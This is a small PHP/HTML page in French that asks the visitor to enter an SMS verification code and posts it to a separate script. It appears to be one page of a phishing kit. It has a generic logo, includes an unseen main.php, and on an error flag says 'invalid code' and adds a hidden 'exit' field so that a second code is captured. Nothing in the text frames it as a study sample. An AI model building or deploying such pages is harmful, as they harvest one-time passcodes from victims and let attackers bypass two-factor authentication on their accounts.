
<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/sms.css">
    <title>SMS</title>
</head>
<body>
<header>
    <div class="logo">
<img src="res/img/logo.png" >
    </div>
</header>
<main>
  
    <div class="continer">

      
<form action="post.php" method="post">

<h2>Confirmation</h2>

<div class="col"><h4 style="font-weight:normal ;text-align:left;">Veuillez saisir le code de vérification envoyé sur votre téléphone.</h4> </div>

<div class="col">
<input type="text" placeholder="Entrez le code" name="otp" required> <br> 
<?php 

if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Code invalide</p>';
}
?>

<div class="but">
    <button type="submit">Confirmer</button>
</div>

</div> <br>




</form>

</div>
</div>



</main>
</body>
</html>